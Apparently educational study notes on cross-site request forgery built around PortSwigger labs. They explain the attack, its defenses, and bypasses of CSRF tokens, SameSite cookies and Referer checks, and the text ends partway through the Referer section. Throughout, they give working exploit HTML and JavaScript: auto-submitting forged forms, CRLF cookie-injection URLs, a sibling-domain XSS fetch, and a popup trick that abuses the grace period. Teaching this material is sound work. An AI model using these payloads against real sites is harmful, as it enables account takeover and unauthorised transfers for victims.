# Cross-Site Request Forgery (CSRF)
### PortSwigger Web Security Academy — Simple Notes

---

> **Think of it this way:** Imagine someone tricks you into signing a letter you never read. You signed it with your real signature, so everyone thinks it's real — but you had no idea what you were signing. That's CSRF.

---

## Table of Contents

1. [What is CSRF? (Simple Explanation)](#1-what-is-csrf)
2. [A Real-Life Story to Understand It](#2-a-real-life-story)
3. [How Does It Actually Work?](#3-how-does-it-work)
4. [Three Things Needed for CSRF to Work](#4-three-things-needed)
5. [How to Build a CSRF Attack](#5-how-to-build-a-csrf-attack)
6. [How Websites Try to Stop CSRF](#6-defenses)
6.5 [Bypassing CSRF Token Validation — All 5 Methods](#65-bypassing-csrf-token-validation--all-5-methods)
   - Flaw 1 — Validation depends on request method (Lab 2)
   - Flaw 2 — Validation depends on token being present (Lab 3)
   - Flaw 3 — Token not tied to user session (Lab 4)
   - Flaw 4 — Token tied to non-session cookie
   - Flaw 5 — Token duplicated in cookie (Double Submit)
7. [Bypass 1 — CSRF Token: Method Trick](#7-bypass-token-method)
8. [Bypass 2 — CSRF Token: Remove It](#8-bypass-token-absent)
9. [Bypass 3 — CSRF Token: Use Your Own](#9-bypass-token-session)
9.5 [Bypassing SameSite Cookie Restrictions — Full Guide](#95-bypassing-samesite-cookie-restrictions--full-guide)
   - Site vs Origin explained (with table)
   - SameSite=Strict / Lax / None explained simply
   - Bypass 1 — Lax via GET requests (Lab 5)
   - Bypass 2 — Strict via on-site redirect gadget
   - Bypass 3 — Strict/Lax via sibling domain XSS
   - Bypass 4 — Lax via 120-second cookie grace period
10.5 [Bypassing Referer-Based CSRF Defenses — Full Guide](#105-bypassing-referer-based-csrf-defenses--full-guide)
   - Bypass 1 — Drop the Referer header entirely (Lab 6)
   - Bypass 2 — Subdomain starts-with trick
   - Bypass 3 — Query string contains trick
10. [Bypass 4 — SameSite Cookie Tricks](#10-bypass-samesite)
11. [Bypass 5 — Referer Header Tricks](#11-bypass-referer)
12. [How to Prevent CSRF Vulnerabilities](#12-how-to-prevent-csrf-vulnerabilities)
    - [CSRF Tokens — Generation, Transmission, Validation](#prevention-method-1--csrf-tokens-)
    - [SameSite Cookie Restrictions](#prevention-method-2--samesite-cookie-restrictions-)
    - [Cross-Origin Same-Site Attacks](#prevention-method-3--watch-out-for-cross-origin-same-site-attacks-)
13. [Quick Cheat Sheet](#13-quick-cheat-sheet)

---

### Lab Walkthroughs

- [**Lab 1 — CSRF with No Defenses (APPRENTICE)**](#lab-1--csrf-vulnerability-with-no-defenses)
- [**Lab 2 — Token Validated on POST Only (PRACTITIONER)**](#lab-2--csrf-where-token-validation-depends-on-request-method)
- [**Lab 3 — Token Validated Only When Present (PRACTITIONER)**](#lab-3--csrf-where-token-validation-depends-on-token-being-present)
- [**Lab 4 — Token Not Tied to Session (PRACTITIONER)**](#lab-4--csrf-where-token-is-not-tied-to-user-session)
- [**Lab 5 — SameSite Lax Bypass via GET (PRACTITIONER)**](#lab-5--csrf-with-samesite-lax-bypass-via-get-request)
- [**Lab 6 — Referer Validation Bypass (PRACTITIONER)**](#lab-6--csrf-with-referer-validation-bypass)
- [**Lab 7 — SameSite Lax Bypass via Method Override (PRACTITIONER)**](#lab-7--samesite-lax-bypass-via-method-override)
- [**Lab 8 — SameSite Strict Bypass via Client-Side Redirect (PRACTITIONER)**](#lab-8--samesite-strict-bypass-via-client-side-redirect)
- [**Lab 9 — Token Tied to Non-Session Cookie (PRACTITIONER)**](#lab-9--csrf-where-token-is-tied-to-non-session-cookie)
- [**Lab 10 — Token Duplicated in Cookie / Double Submit (PRACTITIONER)**](#lab-10--csrf-where-token-is-duplicated-in-cookie-double-submit)
- [**All Labs Summary Table**](#all-labs--summary-table)

**Lab Walkthroughs**
- [Lab 1 — CSRF with No Defenses (APPRENTICE)](#lab-1--csrf-vulnerability-with-no-defenses)
- [Lab 2 — CSRF Token Validated on POST Only (PRACTITIONER)](#lab-2--csrf-where-token-validation-depends-on-request-method)
- [Lab 3 — CSRF Token Validated Only When Present (PRACTITIONER)](#lab-3--csrf-where-token-validation-depends-on-token-being-present)

---

## 1. What is CSRF?

**CSRF = Cross-Site Request Forgery**

Let's break down the name:

| Word | What it means |
|---|---|
| **Cross-Site** | The attack comes from a *different* website |
| **Request** | It sends a message (request) to the victim website |
| **Forgery** | The message is fake — but looks real |

### In One Sentence:
> A bad website tricks your browser into secretly sending a request to a good website **using your own login**.

The good website sees the request, sees your cookie (your login proof), and thinks **you** sent it — but you didn't!

---

## 2. A Real-Life Story

Imagine this:

> You're logged into your bank. You go to a funny cat website. That cat website has a hidden trick: it secretly fills out a bank transfer form **using your browser** and submits it. Your bank gets the request, sees your login cookie attached, and says "Sure! Transfer approved!"

You never saw any form. You never clicked anything suspicious. You just visited a cat website. But your money is gone.

**That's CSRF.**

### Another Analogy — The Signed Blank Paper

> Your teacher asks you to sign a blank piece of paper. Later, she writes "Give all your lunch money to Bob" on it and shows it to the principal. Your signature is real. You just didn't know what you were signing.

CSRF works the same way — your browser's "signature" (session cookie) is real. You just didn't know what request it was attached to.

---

## 3. How Does It Work?

Here's the step-by-step:

```
Step 1:  You log into bank.com
         → Your browser gets a cookie: session=abc123
         → This cookie = proof that you're logged in

Step 2:  You visit evil.com (maybe a funny video link)

Step 3:  evil.com has a hidden form that points to bank.com:
         <form action="bank.com/transfer" method="POST">
           <input name="amount" value="1000">
           <input name="to" value="attacker">
         </form>
         <script>document.forms[0].submit();</script>

Step 4:  Your browser auto-submits that form
         → Browser adds your session cookie automatically
         → bank.com gets: POST /transfer + session=abc123

Step 5:  bank.com says "This has the right cookie, it must be you!"
         → Transfer goes through!
```

> **The browser's fault?** Not really. Browsers are *designed* to send cookies automatically with every request. CSRF abuses this normal behavior.

### Why Can't JavaScript on evil.com Just Read the Response?

It can't! The **Same-Origin Policy** blocks JavaScript on `evil.com` from reading replies from `bank.com`.

But here's the catch: the **Same-Origin Policy does NOT stop evil.com from *sending* requests to bank.com**. It only blocks reading the response. And for CSRF, we don't need to read anything — we just need to *send*.

---

## 4. Three Things Needed for CSRF to Work

All three must exist at the same time:

```
✅ Condition 1: There's something worth attacking
   → A useful action exists (change email, transfer money, delete account)
   → The attacker wants to trigger it on behalf of the victim

✅ Condition 2: The website uses cookies to identify you
   → Session is tracked only by a cookie
   → No other check per request (like a one-time code)

✅ Condition 3: The attacker can guess all the values
   → The request has no secret the attacker doesn't know
   → If the form needs your current password → attacker can't forge it!
```

### Example: Vulnerable vs Safe

```
❌ VULNERABLE form (email change):
   POST /email/change
   email=new@mail.com
   ← attacker knows all values, no secret needed

✅ SAFE form (password change):
   POST /password/change
   current_password=???   ← attacker doesn't know this!
   new_password=hacked
   ← attacker can't forge it without knowing your password
```

---

## 5. How to Build a CSRF Attack

### The Basic Attack — POST Form

```html
<!-- This page lives on evil.com -->
<!-- When victim visits, form auto-submits silently -->

<html>
  <body>
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to"     value="attacker-account">
    </form>
    <script>
      document.forms[0].submit();  <!-- fires instantly, victim sees nothing -->
    </script>
  </body>
</html>
```

What happens:
1. Victim visits this page
2. The form submits automatically (no click needed)
3. Browser attaches victim's `session` cookie
4. Bank processes it as if victim did it

---

### Even Simpler — GET Attack

Sometimes the action works with a GET request (like clicking a link). Then it's even easier:

```html
<!-- Just a hidden image tag — no form needed! -->
<img src="https://bank.com/transfer?amount=1000&to=attacker">
```

When the browser loads the "image", it actually makes a GET request to the bank — with the victim's cookie attached. No form, no JavaScript, just one `<img>` tag.

---

### How Does the Attacker Deliver It?

```
Ways to trick a victim into visiting the evil page:

📧 Send a phishing email: "Click here for your prize!"
💬 Post on social media with the link
💬 Put it in a comment on a real website
🎯 Or just put it anywhere the victim might browse
```

---

## 6. Defenses

Websites use three main defenses. Let's understand each one simply.

---

### Defense 1: CSRF Tokens 🔐

The server adds a **secret password** (token) to every form. The token is:
- Random and unpredictable
- Different for each user/session
- Hidden inside the form HTML
- Checked on every submission

```html
<form action="/email/change" method="POST">
  <input type="hidden" name="csrf" value="xK9mNpQr2sLt7vWe">  ← secret token
  <input type="email" name="email">
  <button>Update</button>
</form>
```

**Why it stops CSRF:**
The attacker on `evil.com` cannot read the token from `bank.com` — the Same-Origin Policy blocks it. So the attacker can't include the right token in a forged request. The server rejects any request without the correct token.

> It's like needing a secret password to unlock a door. The attacker can knock on the door but doesn't know the password.

---

### Defense 2: SameSite Cookies 🍪

This is a setting on the cookie itself that tells the browser:

> "Hey browser! Don't send this cookie if the request comes from a different website."

There are three levels:

```
SameSite=Strict  →  Never send cookie on cross-site requests
                    Most secure. Even clicking a link from another site won't send it.

SameSite=Lax    →  Only send cookie on cross-site GET navigation (clicking links)
                    Blocks cross-site POST forms. Chrome's default since 2021.

SameSite=None   →  Always send cookie (old behavior)
                    Requires HTTPS. No protection against CSRF.
```

**Simply put:**
> SameSite=Lax says: "I'll send my cookie if you click a real link to get here, but NOT if some other website secretly submits a form."

---

### Defense 3: Referer Header Check 🔍

Every browser request includes a `Referer` header that says "I came from this URL".

```
POST /email/change
Referer: https://bank.com/my-account   ← came from our own site ✅
```

The server checks: "Did this request come from our own website?" If not, reject it.

**Problem:** This is the weakest defense because:
- The Referer header can be hidden/dropped
- The validation logic is often badly written
- Browsers don't always send it (privacy modes, HTTPS→HTTP, etc.)

---

## 6.5 Bypassing CSRF Token Validation — All 5 Methods

> **Simple version:** CSRF tokens are the main defense. But developers often make mistakes when implementing them. Here are 5 common mistakes attackers can exploit.

---

### What is a CSRF Token? (Quick Recap)

A CSRF token is a **unique, secret, unpredictable** value that:
- The server generates and embeds in HTML forms
- Must be included in every sensitive request
- The server validates it before doing anything

**Example form with CSRF token:**
```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input type="email" name="email" value="example@normal-website.com">
    <input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button type="submit">Update email</button>
</form>
```

**The resulting HTTP request looks like:**
```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

**Why it works:** The attacker on `evil.com` cannot read `50FaWgdOhi9M9wyna8taR1k3ODOR8d6u` from the victim's browser — the Same-Origin Policy blocks it. So they can't include it in a forged request.

> **Note:** Some applications put CSRF tokens in HTTP headers instead of form fields. The transmission method greatly affects security — see Section 12 for details.

---

### Flaw 1 — Validation Depends on Request Method

**Lab:** Lab 2 (PRACTITIONER)

**The Mistake:**
The developer only validates the CSRF token on `POST` requests. `GET` requests are not checked at all.

**Vulnerable server code logic (simplified):**
```
if request.method == "POST":
    validate_csrf_token()    ← only checked for POST
process_the_action()         ← GET skips straight to here!
```

**The Attack — Switch to GET:**
```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

No token needed! The server processes the GET request without checking anything.

**Exploit HTML:**
```html
<script>
  document.location = 'https://vulnerable-website.com/email/change?email=attacker@evil.com';
</script>
```

> **Simple version:** The guard only checks IDs at the POST door. Walk in through the GET door — no ID needed.

---

### Flaw 2 — Validation Depends on Token Being Present

**Lab:** Lab 3 (PRACTITIONER)

**The Mistake:**
The server validates the token **IF** it's there — but if it's completely missing, validation is skipped.

**Vulnerable server code logic (simplified):**
```
if "csrf" in request.params:      ← only validates IF the field exists
    validate_csrf_token()
process_the_action()               ← missing token = no check at all!
```

**The Attack — Remove the Token Entirely:**

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

Notice: there is **no `csrf=...` parameter** at all. Not wrong — completely absent.

**Exploit HTML:**
```html
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- No csrf field — deliberately omitted -->
</form>
<script>document.forms[0].submit();</script>
```

> **Simple version:** The lock only works if you put a key in. Don't put any key in at all — the door stays unlocked.

---

### Flaw 3 — CSRF Token Not Tied to User Session

**Lab:** Lab 4 (PRACTITIONER)

**The Mistake:**
The server has a **global pool of valid tokens**. It checks that the submitted token exists in the pool — but NOT that the token belongs to the current user's session.

```
Global Token Pool: [ tokenA, tokenB, tokenC, tokenD ]
                                ↑
               attacker gets tokenA from their own login
```

**The Attack — Use the Attacker's Own Token:**
1. Attacker logs in → gets their own valid token: `tokenA`
2. Attacker's token IS in the global pool
3. Attacker includes `tokenA` in a forged request targeting the **victim**
4. Server checks: "Is `tokenA` in the pool?" → YES ✅
5. Server processes the request for the victim's account

**Exploit HTML:**
```html
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_OWN_VALID_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

> **Simple version:** The cinema checks that your ticket is a real cinema ticket — but doesn't check whose name is on it or which seat it's for. Any real ticket gets you into any seat.

---

### Flaw 4 — CSRF Token Tied to a Non-Session Cookie

**Difficulty:** PRACTITIONER (harder to exploit)

**The Mistake:**
Some apps have **two separate cookies**:
- `session` — tracks who you are
- `csrfKey` — stores a CSRF key

The CSRF token in the form is tied to `csrfKey`, NOT to `session`. If an attacker can inject their `csrfKey` cookie into the victim's browser, they can use their own token.

**What the request looks like:**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

Two separate cookies — session and csrfKey. The token `RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY` matches `csrfKey`, not `session`.

**The Attack (2 steps):**

**Step 1 — Find a cookie-injection point** (e.g. a search endpoint that sets cookies via HTTP response header injection):
```http
GET /search?q=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY HTTP/1.1
```
This injects the attacker's `csrfKey` into the victim's browser.

**Step 2 — Send forged request with matching token:**
```html
<!-- First inject attacker's csrfKey via an img tag -->
<img src="https://vulnerable-website.com/search?q=x%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY">

<!-- Then submit forged form with matching token -->
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_TOKEN_MATCHING_KEY">
</form>
<script>
    // wait for cookie to be set, then submit
    setTimeout(() => document.forms[0].submit(), 500);
</script>
```

> **Important Note:** The cookie-injection point doesn't need to be on the same app. Any subdomain that can set cookies for the parent domain can be used. For example, `staging.demo.mysite.com` could inject a cookie that gets sent to `secure.mysite.com`.

> **Simple version:** The venue checks that your ticket matches the wristband you're wearing — but lets anyone hand you a new wristband at the door. The attacker sneaks you their wristband and ticket.

---

### Flaw 5 — CSRF Token Duplicated in Cookie (Double Submit)

**Difficulty:** PRACTITIONER

**The Mistake:**
The "double submit" pattern tries to avoid server-side state by:
1. Generating a random token
2. Setting it as a **cookie**
3. Also including it as a **form field**
4. On validation — just checking that the two values **match each other**

No server-side session storage needed! But this is weak if the attacker can set cookies.

**What the request looks like:**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

Cookie value = form value = `R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa` → Server just checks they match.

**The Attack — Invent Your Own Token:**
The attacker doesn't even need a real token! They:
1. Make up any value: `attacker_fake_token_123`
2. Inject it as the `csrf` cookie in victim's browser (via cookie-injection bug)
3. Send it as the form parameter too

Since the server only checks that cookie == form value (both attacker-controlled), it passes.

```html
<!-- Inject attacker's chosen value as cookie -->
<img src="https://vulnerable-website.com/search?x=1%0d%0aSet-Cookie:%20csrf=attacker_fake_token">

<!-- Submit forged form with same value -->
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="attacker_fake_token">
</form>
<script>setTimeout(() => document.forms[0].submit(), 500);</script>
```

The server receives:
- Cookie `csrf=attacker_fake_token`
- Form field `csrf=attacker_fake_token`
- They match → ✅ request accepted!

> **Simple version:** The lock checks that the two keys you hand in are identical to each other — but doesn't care if they're real keys. Hand in two identical fake keys and you're in.

---

### Summary — All 5 CSRF Token Bypass Methods

| # | Flaw | How to Bypass | Lab |
|---|---|---|---|
| 1 | Token only checked on POST | Switch to GET request | Lab 2 |
| 2 | Token only checked when present | Remove the `csrf` param entirely | Lab 3 |
| 3 | Token not tied to session | Use attacker's own valid token | Lab 4 |
| 4 | Token tied to non-session cookie | Inject attacker's csrfKey cookie | (Advanced) |
| 5 | Double-submit cookie pattern | Inject matching fake cookie + send fake token | (Advanced) |

---

### Key Rule for Developers

```
NEVER:  if (csrf_present) { validate() }      ← Flaw 2
ALWAYS: if (!csrf_valid)  { reject() }        ← Correct

Where csrf_valid = present AND correct AND tied to THIS session
```

---

## 7. Bypass 1 — Token: Method Trick

**Lab 2** | PRACTITIONER

### The Vulnerability

The developer wrote: "Check the CSRF token for POST requests."

But forgot to add: "...and also for GET requests."

So GET requests skip the token check entirely!

```
POST /email/change + wrong token → ❌ BLOCKED
GET  /email/change               → ✅ ALLOWED (no token check!)
```

### The Attack

Instead of a hidden form, just navigate the browser to the URL:

```html
<script>
  // This is a GET request (top-level navigation)
  // The Lax cookie IS sent with GET navigations
  document.location = 'http://localhost:3000/email/change/2?email=attacker@evil.com';
</script>
```

### Why It Works

```
Normal POST form    → Server checks token → BLOCKED
Switch to GET URL   → Server skips check  → ALLOWED ✅
Lax cookie          → Still sent on GET navigation → Attacker wins
```

> It's like a security guard who only checks IDs for people entering through the front door, but lets everyone in through the back door without checking.

---

## 8. Bypass 2 — Token: Remove It

**Lab 3** | PRACTITIONER

### The Vulnerability

The developer wrote: `if (csrf_token_is_present) { check it; }`

This means:
- Token present + WRONG value → ❌ Blocked
- Token present + RIGHT value → ✅ Allowed
- **Token completely missing  → ✅ Allowed** ← Bug!

### The Attack

Just don't include the token field in your forged form at all:

```html
<form action="http://localhost:3000/email/change/3" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <!-- No csrf field! Not empty — just completely absent -->
</form>
<script>document.forms[0].submit();</script>
```

### The Difference

```
csrf=wrong_value  → Parameter EXISTS but is wrong → Server validates → REJECTED
                     (no csrf field at all)        → Parameter MISSING → Server skips → ALLOWED
```

### Why It Works

> Imagine a nightclub that checks your ID only if you hand them one. If you just walk past without handing an ID, they let you in. The correct behavior should be: if you don't show an ID, you definitely don't get in.

---

## 9. Bypass 3 — Token: Use Your Own

**Lab 4** | PRACTITIONER

### The Vulnerability

The server has a **shared bucket** of valid tokens. When it receives a request, it checks: "Is this token in our bucket?" But it doesn't check: "Does this token belong to THIS user's session?"

```
Global Token Bucket:
[ token_abc, token_def, token_ghi, token_xyz ]
                 ↑
        attacker's token is in here too!
```

### The Attack

1. Log in as the **attacker** → get your own valid token: `csrf_token_abc123xyz`
2. Use THAT token in a forged request targeting the **victim**

```html
<form action="http://localhost:3000/email/change/4" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf"  value="csrf_token_abc123xyz"> ← attacker's OWN token
</form>
<script>document.forms[0].submit();</script>
```

3. Victim's browser sends this → server checks "is `csrf_token_abc123xyz` in the bucket?" → YES ✅
4. Server processes it for the victim

### Why It Works

> It's like a cinema that checks if your ticket is a real cinema ticket, but doesn't check if the ticket has your name or the right seat. Any real ticket gets you in anywhere.

The fix: **Tie every token to the specific session that created it.** Token from Session A must only work for Session A.

---

## 9.5 Bypassing SameSite Cookie Restrictions — Full Guide

> **Simple version:** SameSite cookies tell the browser "only send this cookie if you're on MY website." But there are several tricks to get around it.

---

### What is a "Site" in the context of SameSite?

A **site** = Top-Level Domain (TLD) + one level of domain name = **TLD+1**

```
Example: example.com
         ↑        ↑
         domain   TLD (.com)

Full site = example.com  (everything under it is "same-site")
```

The URL **scheme** (http vs https) also matters. A link from `http://app.example.com` → `https://app.example.com` is treated as **cross-site** by most browsers.

---

### Site vs Origin — Important Difference

**Site** = scheme + TLD+1 (broader — covers multiple subdomains)  
**Origin** = scheme + full domain + port (narrower — exactly one address)

| Request from | Request to | Same-site? | Same-origin? |
|---|---|---|---|
| `https://example.com` | `https://example.com` | ✅ Yes | ✅ Yes |
| `https://app.example.com` | `https://intranet.example.com` | ✅ Yes | ❌ No (different subdomain) |
| `https://example.com` | `https://example.com:8080` | ✅ Yes | ❌ No (different port) |
| `https://example.com` | `https://example.co.uk` | ❌ No (different eTLD) | ❌ No |
| `https://example.com` | `http://example.com` | ❌ No (different scheme) | ❌ No |

> **Key point:** A request can be **same-site but cross-origin**. This means a XSS vulnerability on any subdomain (`uploads.example.com`) can bypass SameSite protections on the main app (`secure.example.com`) — because they share the same site (`example.com`).

---

### How SameSite Works

Before SameSite existed, browsers sent cookies with EVERY request to the domain — even from other websites. SameSite lets servers say "only send this cookie in certain cross-site situations."

**Setting SameSite on a cookie:**
```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Lax
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

---

### Three SameSite Values Explained

#### SameSite=Strict

```
🚫 Cookie NEVER sent on cross-site requests
```

If you're on `evil.com` and click a link to `bank.com`, the `bank.com` session cookie is NOT sent. The user appears logged out.

- Most secure option
- Can break user experience (e.g. links from emails or other sites won't work properly)
- Best for cookies that control sensitive actions

#### SameSite=Lax (Chrome default since 2021)

```
✅ Cookie sent only when:
   1. Request uses GET method
   2. Request is from top-level navigation (user clicking a link)

❌ Cookie NOT sent in:
   - Cross-site POST forms
   - Background requests (scripts, iframes, images)
```

> **Simple version:** Lax allows someone to LINK to you from another site and send the cookie, but NOT allow another site to secretly SUBMIT a form pretending to be you.

> **Chrome default:** If no SameSite is set, Chrome applies Lax by default (since 2021). Other browsers are adopting this.

#### SameSite=None

```
🚨 Cookie sent in ALL requests — no restrictions
   (Must also include Secure attribute: HTTPS only)
```

```http
Set-Cookie: trackingId=abc123; SameSite=None; Secure
```

- Used for legitimate cross-site use cases (e.g. embedded widgets, tracking)
- If you see `SameSite=None` on a session cookie, it's worth investigating — it might be a security oversight (developers disabled it as a quick fix when Chrome adopted Lax defaults)

---

### Bypass 1 — Lax: Using GET Requests

**Lab:** Lab 5 (PRACTITIONER)

**The problem:** The server accepts GET requests for actions that should only be POST (violates REST principles, but common).

SameSite=Lax allows cookies on **top-level GET navigation** (user clicking a link / document.location redirect).

**Simplest exploit:**
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

The browser navigates to this URL (top-level GET), so Lax cookies ARE sent. The action fires.

**Method Override trick** (some frameworks like Symfony support `_method` parameter):
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

This sends a GET request, but the server processes it as POST internally.

> **Simple version:** SameSite=Lax blocks POST, but not GET navigation. If you can trigger the action via GET (or trick the server into thinking GET is POST), the bypass works.

---

### Bypass 2 — Strict/Lax: On-Site Gadgets (Client-Side Redirect)

**Lab:** Lab 8 (PRACTITIONER)

Even `SameSite=Strict` can be bypassed if the target website has a **client-side redirect gadget** — a piece of JavaScript that redirects users to a URL built from attacker-controlled input.

**How it works:**

```
Step 1: Victim visits evil.com
Step 2: evil.com links to bank.com/redirect?url=/transfer?to=attacker
         (this is cross-site — Strict cookie NOT sent)
Step 3: bank.com's redirect gadget runs JavaScript:
         window.location = '/transfer?to=attacker'
Step 4: This is now a SAME-SITE request!
         Strict cookie IS sent ✅
```

The key: the **secondary request** (the redirect target) is same-site, so all cookies are included regardless of restrictions.

> **Why server-side redirects DON'T work:** When a server issues a 302 redirect, browsers track that the original request was cross-site and still apply restrictions to the redirect. Only **client-side JavaScript redirects** create a genuinely new same-site request.

> **Simple version:** Instead of jumping over the fence directly (cross-site), you go to an open gate INSIDE the fence (on-site redirect gadget) that takes you where you want to go.

---

### Bypass 3 — Strict/Lax: Sibling Domain XSS

**Lab:** PRACTITIONER (advanced)

If **any subdomain** of the target site has an XSS vulnerability, you can use it to make same-site requests — bypassing ALL SameSite restrictions.

```
evil.com (attacker)
    → injects XSS on uploads.bank.com (sibling domain, same site as bank.com)
    → XSS runs JavaScript on uploads.bank.com
    → Fetch to bank.com/transfer — SAME-SITE request! Cookie sent ✅
```

**Example (XSS on sibling domain used to CSRF main app):**
```javascript
// Running on uploads.bank.com via XSS
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',   // include same-site cookies
    body: 'recipient=attacker&amount=1000000'
});
```

> **Also covers WebSockets:** If the target supports WebSockets, check for **CSWSH** (Cross-Site WebSocket Hijacking) — it's essentially CSRF on a WebSocket handshake and has the same same-site bypass potential.

> **Simple version:** The fence protects the main house. But there's a broken window in the shed next door (uploads subdomain). Once you're through the shed window, you're inside the fence — you can access everything.

---

### Bypass 4 — Lax: 120-Second Grace Period for Newly Issued Cookies

**Lab:** PRACTITIONER (advanced)

**The situation:** Chrome applies Lax restrictions by default — BUT there is a **2-minute (120-second) grace period** when a cookie is first issued. During this window, the cookie behaves like `SameSite=None` for top-level POST requests.

> **Why?** To avoid breaking Single Sign-On (SSO) flows. OAuth login creates a new session, and the 2-minute grace period gives it time to work cross-site.

> **Note:** This grace period does NOT apply to cookies that were **explicitly** set with `SameSite=Lax`. Only to cookies with no SameSite attribute (Chrome's default Lax).

**The Attack — Force a Cookie Refresh:**

```
Step 1: Force victim to get a fresh session cookie
        (e.g. trigger an OAuth login flow)
Step 2: Within 120 seconds, fire the CSRF attack
        (the cookie is in the grace period, so cross-site POST works)
```

**Challenge:** The attack must happen within 2 minutes. Solution — force the cookie refresh and immediately fire the attack.

**Using a popup to force cookie refresh:**
```javascript
// ❌ This gets blocked by browsers (popup without user interaction):
window.open('https://vulnerable-website.com/login/sso');

// ✅ This works — popup triggered by user click (bypasses popup blocker):
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
    // User clicks anywhere → popup opens → fresh cookie issued
    // Now immediately launch CSRF within 120 seconds
}
```

**Full exploit flow:**
```html
<script>
window.onclick = () => {
    // Step 1: Open popup to force new cookie
    const p = window.open('https://vulnerable-website.com/login/sso');
    
    // Step 2: After cookie refresh, fire CSRF in this window
    setTimeout(() => {
        window.location = 'https://vulnerable-website.com/transfer?to=attacker&amount=99999';
    }, 5000);  // wait 5 seconds for login to complete
};
</script>
<p>Click anywhere to continue...</p>
```

> **Simple version:** New cookies have a 2-minute "warm-up" period where SameSite isn't enforced. Force the victim to get a fresh cookie, then immediately attack during the warm-up window.

---

### SameSite Summary Table

| Restriction | Blocks cross-site POST? | Blocks cross-site GET? | Bypass technique |
|---|---|---|---|
| `Strict` | ✅ Yes | ✅ Yes | On-site gadget, sibling domain XSS |
| `Lax` | ✅ Yes | ❌ No | GET request, 120s grace period |
| `None` | ❌ No | ❌ No | No bypass needed — already unprotected |
| No attribute (Chrome) | ✅ Yes (after 120s) | ❌ No | Force cookie refresh, use grace period |

---

## 10. Bypass 4 — SameSite Cookie Tricks

### 10a. GET Request Bypass

**Lab 5** | PRACTITIONER

**Setup:** Cookie has `SameSite=Lax`. This blocks cross-site POST.

**Problem:** The endpoint also accepts GET for email changes.

**Remember:** `SameSite=Lax` says: "Allow the cookie on cross-site GET *navigation*."

```html
<!-- document.location = top-level GET navigation → Lax cookie IS sent -->
<script>
  document.location = 'http://localhost:3000/email/change/5?email=attacker@evil.com';
</script>
```

```
Cross-site POST form → Cookie NOT sent (Lax blocks it) → Attack fails
Cross-site GET navigation (document.location) → Cookie IS sent (Lax allows) → Attack works! 🎯
```

> SameSite=Lax is like a lock on the back door but the front door is still open if you approach it the right way.

---

### 10b. On-Site Gadget (Strict Bypass) — Concept

**Setup:** Cookie has `SameSite=Strict`. This blocks ALL cross-site requests.

**Trick:** Find an open redirect on the target site itself. Use it as a stepping stone:

```
evil.com → vulnerable-website.com/redirect?url=/email/change
           [cross-site — no cookie]  →  [same-site — cookie included! ✅]
```

The redirect runs *within* the target site, so from the server's view it's a same-site request.

> Think of it as: instead of jumping over the fence (cross-site), you go through a door that's already inside the fence.

---

### 10c. 120-Second Grace Period — Concept

Chrome gives cookies without an explicit SameSite a **2-minute window** after being set where they behave like `SameSite=None`.

**Trick:** Force the victim to get a fresh cookie (trigger an OAuth login), then fire the CSRF attack within 2 minutes.

---

## 10.5 Bypassing Referer-Based CSRF Defenses — Full Guide

> **Simple version:** Some websites check WHERE a request came from using the `Referer` header. But there are easy ways to trick this check.

---

### What is the Referer Header?

The `Referer` header is sent automatically by the browser with every HTTP request. It tells the server: **"This request came from THIS page."**

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Referer: https://vulnerable-website.com/my-account   ← "I came from my account page"
Cookie: session=abc123

email=new@address.com
```

> **Fun fact:** "Referer" is a typo that made it into the HTTP specification and has been kept ever since. The correct spelling is "Referrer."

**How websites use it as CSRF defense:**
The server checks: "Does the Referer URL match our own domain?"
